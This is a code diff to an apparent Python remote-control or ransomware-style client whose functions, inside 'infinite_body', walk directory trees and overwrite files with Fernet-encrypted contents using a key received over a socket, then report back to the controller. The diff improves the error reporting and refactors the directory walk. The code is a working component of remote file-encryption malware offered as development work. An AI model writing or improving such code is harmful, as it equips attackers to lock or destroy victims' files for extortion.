@@ -59,8 +59,8 @@ def infinite_body():
                 encrypted_data = f.encrypt(file_data)
                 with open(filename, "wb") as file:
                     file.write(encrypted_data)
-            except:
-                pass
+            except Exception as error:
+                return repr(error)
 
         def decrypt_file(filename, key):
             f = Fernet(key)
@@ -70,22 +70,23 @@ def infinite_body():
                 decrypted_data = f.decrypt(encrypted_data)
                 with open(filename, "wb") as file:
                     file.write(decrypted_data)
-            except:
-                pass
+            except Exception as error:
+                return repr(error)
+
+        def walk_tree(path):
+            tree = os.walk(path)
+            for folder in tree:
+                for file in folder[2]:
+                    full_path = os.path.join(folder[0], file)
+                    yield full_path
 
         def encrypt_directory(path, key):
-            tree = os.walk(path)
-            for folder in tree:
-                for file in folder[2]:
-                    full_path = os.path.join(folder[0], file)
-                    EncryptDecrypt.encrypt_file(full_path, key)
+            for full_path in EncryptDecrypt.walk_tree(path):
+                EncryptDecrypt.encrypt_file(full_path, key)
 
         def decrypt_directory(path, key):
-            tree = os.walk(path)
-            for folder in tree:
-                for file in folder[2]:
-                    full_path = os.path.join(folder[0], file)
-                    EncryptDecrypt.decrypt_file(full_path, key)
+            for full_path in EncryptDecrypt.walk_tree(path):
+                EncryptDecrypt.decrypt_file(full_path, key)
 
     def time_stamp(filename):
         from datetime import datetime
@@ -157,8 +158,11 @@ def infinite_body():
         key = s.recv(BUFFER_SIZE)
         ed = EncryptDecrypt
         if os.path.isfile(path):
-            ed.encrypt_file(path, key)
-            s.send('Completed!'.encode())
+            msg = ed.encrypt_file(path, key)
+            if msg:
+                s.send(msg.encode())
+            else:
+                s.send('Completed!'.encode())
         elif os.path.isdir(path):
             ed.encrypt_directory(path, key)
             s.send('Completed!'.encode())
@@ -170,8 +174,11 @@ def infinite_body():
         key = s.recv(BUFFER_SIZE)
         ed = EncryptDecrypt
         if os.path.isfile(path):
-            ed.decrypt_file(path, key)
-            s.send('Completed!'.encode())
+            msg = ed.decrypt_file(path, key)
+            if msg:
+                s.send(msg.encode())
+            else:
+                s.send('Completed!'.encode())
         elif os.path.isdir(path):
             ed.decrypt_directory(path, key)
             s.send('Completed!'.encode())
